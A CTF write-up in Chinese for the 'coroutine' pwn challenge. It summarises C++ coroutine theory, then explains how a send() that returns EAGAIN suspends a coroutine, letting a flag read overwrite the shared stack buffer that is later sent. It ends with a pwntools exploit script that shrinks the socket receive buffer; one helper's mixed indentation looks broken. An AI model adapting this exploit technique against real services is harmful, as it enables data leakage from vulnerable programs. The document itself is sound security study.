## Pwn

### coroutine

在打這題之前需要對 coroutine 有基本的了解，而我推薦[文章 coroutine-theory](https://lewissbaker.github.io/2017/09/25/coroutine-theory)，基本上只要看了這篇後就能解出題目，以下是文章中的重點筆記：

- A coroutine is a generalisation of a function that allows the function to **be suspended** and then **later resumed**
  - 可以暫停並重新執行
- 一般的 function 的操作大致分成 call 與 return
  - Call: 建立一塊 activation frame，並將執行權限轉移
  - Return: destroys activation frame 後將執行結果 (回傳值) 傳給 caller
  - Activation frame - a block of memory that holds the **current state** of a particular invocation of a function
- Coroutines 將 function 的操作轉成三種: Suspend, Resume and Destroy
  - Suspends:
    1. stop execution of the coroutine at the current point
    2. transfers execution back to the **caller** or **resumer** without destroying the activation frame
    3. 只能在 well-defined suspend-points 停止，所以也不能說是任意停 (?
  - Resume: restore execution of a suspended coroutine at the point at which it was suspended
    - 也就是說 reactivates 此 coroutine 的 activation frame
  - Destroy: destroys the activation frame without resuming execution of the coroutine
- 可以將 coroutine 的 activation frame 視為兩個部分：
  - coroutine frame - persists while the coroutine is suspended
  - stack frame - exists while the coroutine is executing and **is freed when the coroutine suspends** and transfers execution back to the caller/resumer
- Suspend 能透過 keyword 來使用，像是 `co_await` 以及 `co_yield`，又被稱作 suspend-points
  - 當執行到 suspend-point 時，coroutine 會做以下準備：
    - 將 register 存於 coroutine frame
    - 寫一個值到 coroutine frame，代表 coroutine 目前是停在哪個 suspend-point
- Resume 用於恢復先前狀態，可以用 function call `coroutine_handle.resume()` 來達到
  - 根據特殊 ID 判斷 coroutine 停在哪個地方
  - 分配一塊新的 stack-frame，並將 caller 的 return-address 存到裡面
- Destroy 能透過呼叫 `coroutine_handle.resume()` 達成，跟 resume 一樣會看停止的地方決定處理方法
- Call
  - 當 function 執行完或是到達第一個 suspend-point 時，都會將執行權限交給 caller
  - Coroutine 在被呼叫時的第一件事情就是在 heap 上分配 coroutine-frame，並 copy/move stack-frame 的參數到 coroutine-frame
- Return
  - `co_return` keyword 會回傳 return value

總結來說：

- Coroutine 能做 **Suspend** 或 **Destroy** 
- 當 **Suspend**/**Destroy** 發生時執行權限會轉交給 caller/resumer
- **Return** 會回傳一個代表該 coroutine 的 handle，後續要 resume 時就可以直接呼叫 `handle.resume()`



---

題目的利用點在於當 SendSync 進入 coroutine 之前會先判斷是否需要轉移執行權限，而當 `SendSync.await_ready()` 的 `send()` return `EAGAIN` 時就代表 coroutine 還沒辦法執行完，所以會轉移執行權限，而此時 `run_until_done()` 會握有執行權，並且執行再次執行 `loadflag()`，然而用來讀 flag 的 buffer 會跟用來 send 的 buffer 重疊 (因為都在 stack 上)，因此一旦 _write 當中的 coroutine `resume()`，代表又會執行一次 `send()` function，而此時 stack 的資料已經被改成 flag。下列為關鍵的 `SendSync.await_ready()` function：

```c
bool await_ready() {
    int result = ::send(fd_, buffer_.data(), buffer_.size(), 0); // here
    if (result == -1 && (errno == EAGAIN || errno == EWOULDBLOCK))
    {
        return false;
    }

    result_ = result;
    return true;
}
```

因此問題變成要怎麼讓 `send()` 回傳 `EAGAIN`，這篇[文章](https://www.ibm.com/support/pages/why-does-send-return-eagain-ewouldblock)有提到說如果 receiver 的 recv buffer 已經滿了，則有可能就會讓 `send()` 回傳 EAGAIN，而要怎麼讓 recv buffer 滿，則是使用 proxy.py 提供的 `setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, size)` 功能，不過最小的 recv buffer size 似乎為 2304，如果小於此值就會自動調成該值。

除此之外還有一些很關鍵的點，因為漏失這些關鍵使得我沒有在賽中成功解開題目：

1. 必須要在執行 `connect()` **前**呼叫 `setsockopt(socket.SO_RCVBUF)` 設定 recv buffer，否則不會生效
2. proxy.py 都會再輸入前印出 prompt `>`，但是如果 `recv()` 要等到 prompt 出來才執行會太慢，所以 option 5 接收資料時就直接送給 proxy.py size 與 option number
3. 最後就確保每次 option 5 間都簡單 sleep 一下，讓這些資料不要被串起來

以下為更新後的 exploit：

```python
#!/usr/bin/python3

import time
from pwn import *
from sys import argv

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(argv) > 1:
    r = remote('coroutine.chal.idek.team', 1337)
else:
    r = process(['python3', 'proxy.py'])

def conn():
    r.sendlineafter('> ', '1')

def ch_recv(sz):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Buffer size> ', str(sz))

def ch_send(sz):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Buffer size> ', str(sz))

def send(data):
    r.sendlineafter('> ', '4')
    r.sendlineafter('Data> ', data)

def recv(sz):
	r.sendline('5')
    r.sendline(str(sz))
    #r.sendlineafter('> ', '5')
    #r.sendlineafter('Size> ', str(sz))

ch_recv(128) # 0 ~ 1152
conn()

## fill recv buffer
for i in range(8):
    send('A' * 511)

for _ in range(4):
    time.sleep(0.5)
    recv(10000)

r.interactive()
```

